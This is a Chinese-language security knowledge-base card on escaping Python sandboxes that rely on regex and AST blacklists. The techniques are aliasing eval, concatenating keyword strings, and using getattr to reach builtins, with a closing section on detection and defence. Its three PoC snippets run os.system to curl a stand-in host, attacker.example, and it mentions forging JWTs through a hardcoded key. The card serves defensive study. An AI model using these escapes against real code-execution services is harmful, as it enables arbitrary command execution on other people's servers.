---
id: binary-pwn-sandbox-escape-python-regex-ast-alias-concat
title: 正则+AST 双层黑名单沙箱绕过：别名调用、字符串拼接与动态属性访问
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-regex-ast-blacklist-bypass
aliases:
- AST 黑名单绕过
- 正则黑名单绕过
- Python safe_exec 绕过
- 别名调用绕过
- 字符串拼接绕过关键字
- getattr 动态访问绕过
tags:
- python
- pyjail
- sandbox-escape
- ast
- regex
- blacklist-bypass
- getattr
- code-execution
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:28:11+08:00'
  notes: 已对照原文与图02/03/05-11核对：safe_exec.py 正则黑名单（os.system/eval/__import__ 等）与 AST 检查（Call.func.id、Attribute 模块、getattr 特判）与卡中描述一致；三种绕过均由图05-11 的 200 响应与 DNSLog 回显验证。核对时把卡内“该认证问题未单独成卡”的过时表述改为指向 JWT 硬编码密钥卡。PoC 未在本机执行。
---

## 一句话结论

如果 Python 代码执行沙箱只用“正则扫源码 + AST 检查直接调用名/属性名”的黑名单，攻击者可用 `e = eval` 这类别名调用、`"__im"+"port__"` 这类字符串拼接、以及 `g(obj, "__globals__")`/字典取值代替 `obj.__globals__`，让正则和 AST 都看不到危险关键词，最终仍执行任意代码。

## 原理

- 正则是对执行前的源码字符串做字面匹配（如 `\beval\s*\(`、`\b__import__\s*\(`、`\bos\.system\b`）；把关键词拆成多段字符串再拼接，源码中就不存在完整单词。
- AST 检查通常只看 `ast.Call` 的 `func.id` 是否在黑名单（`eval`、`exec`、`getattr`、`__import__`）以及 `ast.Attribute` 是否为敏感属性（`__globals__`、`__builtins__`）。它不做数据流/别名分析：`e = eval; e(...)` 中 `Call.func.id` 是 `e`，不在黑名单。
- 属性访问换成 `getattr(obj, name)`（先把 `getattr` 赋给别名 `g`）或 `obj.__dict__[name]`/字典键取值后，`ast.Attribute` 检查失效；第二个参数用变量而非字面量，也能避开针对 `getattr(builtins, "__import__")` 的专项检查。
- 若执行环境注入了 `pandas`/`numpy` 等复杂库，可 `g(pd, "__builtins__")` 拿到内置命名空间（库的 `__globals__`/模块字典里通常有 builtins 引用），再 `__import__("os").system(...)`；整个过程没有任何完整危险单词或敏感属性访问。
- 之所以成立：静态黑名单只能识别“写法”，不能识别“语义”；动态语言里同一个能力有无数种等价写法。

## 触发条件

- 应用提供“用户提交 Python 代码并由服务端执行”的功能（指标计算、策略回测、公式执行等）；
- 防护是正则黑名单 + AST 黑名单，且执行环境仍暴露完整 builtins/第三方库；
- 攻击者能提交代码（通常还需要通过认证，如伪造 JWT）；
- 执行结果/副作用（DNSLog、回连）可被攻击者观测。

## 利用步骤

1. 先提交 `import os; os.system(...)` 确认被拦截，观察拦截信息判断是正则还是 AST。
2. 别名 + 拼接：`e = eval`，用 `"__im"+"port__"`、`"o"+"s"`、`"sys"+"tem"` 构造字符串，`e(...)` 执行。
3. 属性规避：`g = getattr`；`g(lambda:0, "__globals__")["__builtins__"]["eval"]`，键名也拼接。
4. 依赖漫游：若环境注入了 `pd`，`b = g(pd, "__builtins__")`，再取 `__import__`（兼容 dict/module 两种形式），`g(i("os"), "system")("id")`。
5. 用 DNSLog/回连验证执行；需要回显时把命令输出写文件或通过异常带出。

## PoC

```python
# 思路 1：别名 + 字符串拼接
e = eval
p = "__im" + "port__"
o = "o" + "s"
s = "sys" + "tem"
e(p + "('" + o + "')." + s + "('curl attacker.example')")
```

```python
# 思路 2：lambda 全局空间 + builtins
g = getattr
gn = "__glob" + "als__"
bn = "__buil" + "tins__"
e = g(lambda: 0, gn)[bn]['ev' + 'al']
e('__im' + 'port__("os").system("curl attacker.example")')
```

```python
# 思路 3：利用注入的 pandas 漫游 builtins
g = getattr
bk = '__buil' + 'tins__'
b = g(pd, bk)
ik = '__im' + 'port__'
i = b[ik] if isinstance(b, dict) else g(b, ik)
ok = 'o' + 's'
sk = 'sys' + 'tem'
g(i(ok), sk)('curl attacker.example')
```

## 变体与关联

- 变体：`operator.attrgetter`/`operator.methodcaller` 代替 getattr；`vars(obj)`/`obj.__dict__`；`functools.reduce` 组合调用；`compile`/`exec` 绕过单表达式限制；Unicode 同形字绕过正则（见关联卡）。
- 关联：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]（NFKC/Unicode 与单表达式限制）；[[binary-pwn-sandbox-escape-python-jail-subclass-traversal]]（`__subclasses__` 链）；[[binary-pwn-sandbox-escape-python-builtins-none-list-dict-alias]]（builtins 被清空时的恢复）。
- 影响边界：需要代码执行入口且黑名单实现如上述；若沙箱同时限制 builtins、模块导入、文件/网络并做进程隔离，单靠写法绕过不足以获得实际危害。
- 实战背景：目标系统的示例配置还硬编码了 JWT `SECRET_KEY`，可先伪造 admin token 再到达执行接口（该认证问题另见 JWT 硬编码密钥卡）。

## 检测与防御

- 检测：提交代码中出现变量赋值给内置函数（`x = eval`）、大量字符串拼接、`getattr`/`vars`/`__dict__` 动态访问；执行进程产生异常外连/DNS 查询；AST 中 `Call.func` 为变量而非白名单函数。
- 防御：不要用正则/AST 黑名单作为安全边界；改用进程级隔离（容器、seccomp、只读文件系统、无网络、非特权用户）与能力白名单；执行前用 AST 白名单只允许算术/受限调用；清空 `__builtins__` 并只注入安全函数；禁止第三方库对象进入执行命名空间；对执行时长、资源、外连做限制。
